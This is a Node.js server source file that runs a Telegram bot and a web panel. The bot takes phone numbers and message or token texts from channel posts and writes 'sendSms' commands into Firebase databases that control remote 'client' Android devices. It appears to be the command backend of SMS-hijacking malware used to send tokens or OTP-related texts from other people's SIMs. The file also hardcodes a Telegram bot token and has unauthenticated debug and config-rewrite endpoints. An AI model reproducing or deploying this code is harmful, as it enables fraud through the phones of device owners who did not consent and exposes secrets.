const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const http = require('http');
const https = require('https');
const { Telegraf } = require('telegraf');

// Keep-Alive for speed
const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 100 });
const axiosInstance = axios.create({ httpAgent, httpsAgent, timeout: 10000 });

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '8951263426:AAHwMiQZY_QIuiHR17_rDNON9zwg-dT3mPc';
const DATA_FILE = '/app/data/data.json';

let store = { users: {} };
let processed = new Set();
let cfgCache = {};
const CFG_TTL = 300000;
const CFG_REFRESH_INTERVAL = 15000;

function load() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            store = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        }
    } catch (e) { console.error('Load error:', e.message); }
}

function save() {
    try {
        const dir = path.dirname(DATA_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2));
    } catch (e) { console.error('Save error:', e.message); }
}

load();

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', function (req, res) {
    const p = path.join(__dirname, 'panel.html');
    if (fs.existsSync(p)) res.sendFile(p);
    else res.send('panel.html missing');
});

// Register user
app.post('/api/register', function (req, res) {
    const u = req.body.firebaseUrl;
    if (!u) return res.status(400).json({ error: 'missing url' });
    const clean = u.replace(/\/$/, '');
    store.users[clean] = store.users[clean] || {};
    store.users[clean].registeredAt = Date.now();
    save();

    refreshCfg(clean).then(function (cfg) {
        console.log('✅ Registered:', clean);
    }).catch(function () {
        console.log('✅ Registered (pending):', clean);
    });

    res.json({ ok: true });
});

// Unregister
app.post('/api/unregister', function (req, res) {
    const u = req.body.firebaseUrl;
    if (!u) return res.status(400).json({ error: 'missing url' });
    const clean = u.replace(/\/$/, '');
    delete store.users[clean];
    delete cfgCache[clean];
    save();
    console.log('🗑️ Unregistered:', clean);
    res.json({ ok: true });
});

app.get('/api/status', function (req, res) {
    res.json({
        ok: true,
        users: Object.keys(store.users).length,
        cached: Object.keys(cfgCache).length,
        userList: Object.keys(store.users)
    });
});

// ⭐ DEBUG — Firebase config browser me dekhne ke liye
app.get('/api/debug-config', async function (req, res) {
    try {
        const url = req.query.url;
        if (!url) {
            const list = Object.keys(store.users);
            return res.json({ 
                users: list, 
                hint: 'Add ?url=YOUR_FIREBASE_URL to see bot_config',
                example: '/api/debug-config?url=' + (list[0] || 'YOUR_FIREBASE_URL')
            });
        }
        const clean = url.replace(/\/$/, '');
        const cfg = await fbGet(clean, 'bot_config');
        const clients = await fbGet(clean, 'clients');

        let deviceInfo = null;
        if (clients && typeof clients === 'object') {
            deviceInfo = Object.keys(clients).map(id => ({
                id: id,
                name: clients[id] && (clients[id].modelName || clients[id].model || id),
                status: clients[id] && clients[id].status
            }));
        }

        res.json({
            firebaseUrl: clean,
            bot_config: cfg,
            channels_check: cfg && cfg.channels ? cfg.channels : null,
            devices_check: cfg && cfg.devices ? cfg.devices : null,
            legacy_tokenDevice: cfg && cfg.tokenDevice ? cfg.tokenDevice : null,
            legacy_tokenEnabled: cfg && cfg.tokenEnabled ? cfg.tokenEnabled : null,
            actual_devices: deviceInfo,
            diagnosis: {
                has_channels: cfg && cfg.channels && cfg.channels.length > 0,
                has_devices: cfg && cfg.devices && Object.keys(cfg.devices).length > 0,
                has_any_enabled_device: cfg && cfg.devices ? Object.values(cfg.devices).some(d => d && d.enabled === true) : false,
                has_legacy_device: !!(cfg && cfg.tokenEnabled && cfg.tokenDevice)
            }
        });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// ⭐ FIX — Browser se hi bot_config set kar do
app.get('/api/fix-config', async function (req, res) {
    try {
        const url = req.query.url;
        const channel = req.query.channel;
        const device = req.query.device;
        const sim = parseInt(req.query.sim) || 0;

        if (!url || !channel || !device) {
            return res.json({ 
                error: 'Missing params',
                usage: '/api/fix-config?url=FIREBASE_URL&channel=CHANNEL_ID&device=DEVICE_ID&sim=0'
            });
        }

        const clean = url.replace(/\/$/, '');
        const cfg = {
            channels: [channel],
            devices: {},
            updatedAt: Date.now()
        };
        cfg.devices[device] = {
            enabled: true,
            simSlot: sim,
            deviceName: 'Auto-fixed',
            updatedAt: Date.now()
        };
        cfg.tokenDevice = device;
        cfg.tokenEnabled = true;
        cfg.tokenSim = sim;

        await Zp(clean, 'bot_config', cfg);
        cfgCache[clean] = { cfg: cfg, at: Date.now() };

        res.json({ 
            ok: true, 
            message: 'Config saved! Now test Telegram.',
            saved_config: cfg
        });
    } catch (e) {
        res.json({ error: e.message });
    }
});

// Helper for PUT
async function Zp(url, p, data) {
    try {
        const r = await axiosInstance.put(url.replace(/\/$/, '') + '/' + p + '.json', data);
        return r.status === 200;
    } catch (e) { return false; }
}

app.post('/api/notify-channel', async function (req, res) {
    try {
        const channel = req.body.channel;
        const action = req.body.action;
        const sim = req.body.sim || 0;
        const deviceName = req.body.deviceName || 'Unknown';
        const firebaseUrl = req.body.firebaseUrl;

        if (!channel) return res.json({ ok: false, error: 'no channel' });

        const msg = action === 'on'
            ? ('✅ Token CHALU\n📱 Device: ' + deviceName + '\n📶 SIM: ' + (sim + 1) + '\n🔗 ' + firebaseUrl)
            : ('❌ Token BAND\n📱 Device: ' + deviceName + '\n🔗 ' + firebaseUrl);

        await bot.telegram.sendMessage(channel, msg);

        if (firebaseUrl) {
            await refreshCfg(firebaseUrl.replace(/\/$/, ''));
        }

        res.json({ ok: true });
    } catch (e) {
        console.error('notify-channel error:', e.message);
        res.json({ ok: false, error: e.message });
    }
});

app.listen(PORT, '0.0.0.0', function () {
    console.log('🚀 Server on port ' + PORT + ' | Keep-Alive ON');
    Object.keys(store.users).forEach(function (u) {
        refreshCfg(u).catch(function () {});
    });
});

async function fbGet(url, p) {
    try {
        const r = await axiosInstance.get(url.replace(/\/$/, '') + '/' + p + '.json');
        return r.data;
    } catch (e) { return null; }
}

async function fbPut(url, p, data) {
    try {
        const r = await axiosInstance.put(url.replace(/\/$/, '') + '/' + p + '.json', data);
        return r.status === 200;
    } catch (e) { return false; }
}

function getCfg(u) {
    const c = cfgCache[u];
    if (c && (Date.now() - c.at) < CFG_TTL) return c.cfg;
    return null;
}

function refreshCfg(u) {
    return fbGet(u, 'bot_config')
        .then(function (cfg) {
            cfgCache[u] = { cfg: cfg, at: Date.now() };
            return cfg;
        })
        .catch(function () { return null; });
}

setInterval(function () {
    Object.keys(store.users).forEach(function (u) {
        refreshCfg(u).catch(function () {});
    });
}, CFG_REFRESH_INTERVAL);

const bot = new Telegraf(BOT_TOKEN);

function extract(text) {
    if (!text) return null;
    var patterns = [
        /To\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
        /Receipt\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
        /Number\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
        /Phone\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
        /Mobile\s*[:\-]?[\s\n]*\+?(\d{10,12})/i
    ];
    var number = null;
    for (var i = 0; i < patterns.length; i++) {
        var m = text.match(patterns[i]);
        if (m) { number = m[1]; break; }
    }
    if (!number) return null;

    var bodyPatterns = [
        /Body\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /Message\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /Msg\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /Token\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /OTP\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /Code\s*[:\-]?[\s\n]*([\s\S]+)/i
    ];
    var message = null;
    for (var j = 0; j < bodyPatterns.length; j++) {
        var b = text.match(bodyPatterns[j]);
        if (b && b[1]) {
            message = b[1].replace(/^[\s\n\r]+/, '').replace(/[\s\n\r]+$/, '');
            if (message) break;
        }
    }
    if (!message) return null;
    return { number: number, message: message };
}

bot.on('channel_post', async function (ctx) {
    const start = Date.now();
    const text = ctx.channelPost.text || ctx.channelPost.caption || '';
    const chatId = ctx.chat.id.toString();
    const msgId = ctx.channelPost.message_id;

    if (!text) return;

    const tok = extract(text);
    if (!tok) return;

    const globalKey = chatId + '_' + msgId;
    if (processed.has(globalKey)) return;
    processed.add(globalKey);
    if (processed.size > 5000) processed = new Set(Array.from(processed).slice(-2000));

    console.log('\n=== NEW MSG ===');
    console.log('Chat:', chatId, 'MsgId:', msgId);
    console.log('Number:', tok.number);

    const urls = Object.keys(store.users);
    console.log('Checking', urls.length, 'users');

    await Promise.all(urls.map(async function (fbUrl) {
        try {
            let cfg = getCfg(fbUrl);
            if (!cfg) {
                cfg = cfgCache[fbUrl] ? cfgCache[fbUrl].cfg : null;
                refreshCfg(fbUrl).catch(function () {});
            }
            if (!cfg) cfg = await refreshCfg(fbUrl);
            if (!cfg) {
                console.log('❌ No config for', fbUrl);
                return;
            }

            console.log('  → Checking channels:', JSON.stringify(cfg.channels), 'against', chatId);

            if (!cfg.channels || cfg.channels.indexOf(chatId) === -1) {
                console.log('  → Channel mismatch, skipping');
                return;
            }

            let targetDevice = null;
            let simSlot = 0;

            if (cfg.devices && typeof cfg.devices === 'object') {
                const enabled = Object.entries(cfg.devices).filter(([id, d]) => d && d.enabled === true);
                if (enabled.length > 0) {
                    targetDevice = enabled[0][0];
                    simSlot = enabled[0][1].simSlot != null ? enabled[0][1].simSlot : 0;
                }
            }

            if (!targetDevice && cfg.tokenEnabled && cfg.tokenDevice) {
                targetDevice = cfg.tokenDevice;
                simSlot = cfg.tokenSim || 0;
            }

            if (!targetDevice) {
                console.log('  → No enabled device');
                return;
            }

            const clean = String(tok.number).trim();
            const ts = Date.now();

            console.log('✅ MATCH! Sending to device:', targetDevice, 'SIM:', simSlot);

            const fbStart = Date.now();
            await fbPut(fbUrl, 'clients/' + targetDevice + '/webhookEvent/sendSms', {
                to: clean,
                message: tok.message,
                isSended: false,
                timestamp: ts,
                commandId: 'tk_' + ts + '_' + Math.random().toString(36).slice(2, 8),
                simInfo: { simSlot: simSlot },
                fromToken: true
            });
            const fbTime = Date.now() - fbStart;

            const reply = '✅ SMS Bhej diya\n\n' +
                '📱 Device: ' + targetDevice + '\n' +
                '📞 To: ' + clean + '\n' +
                '📶 SIM: ' + (simSlot + 1) + '\n' +
                '⚡ Firebase: ' + fbTime + 'ms\n' +
                '🔗 ' + fbUrl + '\n\n' +
                '📝 Body:\n' + tok.message;

            bot.telegram.sendMessage(chatId, reply, {
                reply_to_message_id: msgId
            }).catch(function () {});

            console.log('✅ Sent | Firebase:', fbTime + 'ms');

        } catch (e) {
            console.error('Error:', fbUrl, e.message);
        }
    }));
});

bot.command('id', function (ctx) {
    ctx.reply('ID: ' + ctx.from.id + '\nChat: ' + ctx.chat.id);
});

bot.command('start', function (ctx) {
    ctx.reply('ANANYA Bot Active');
});

bot.command('status', function (ctx) {
    const users = Object.keys(store.users);
    ctx.reply('Users: ' + users.length + '\n' + users.join('\n'));
});

bot.launch()
    .then(function () {
        console.log('✅ Bot started');
        Object.keys(store.users).forEach(function (u) {
            refreshCfg(u).catch(function () {});
        });
    })
    .catch(function (e) {
        console.log('❌ Bot error:', e.message);
    });

process.once('SIGINT', function () { bot.stop('SIGINT'); });
process.once('SIGTERM', function () { bot.stop('SIGTERM'); });
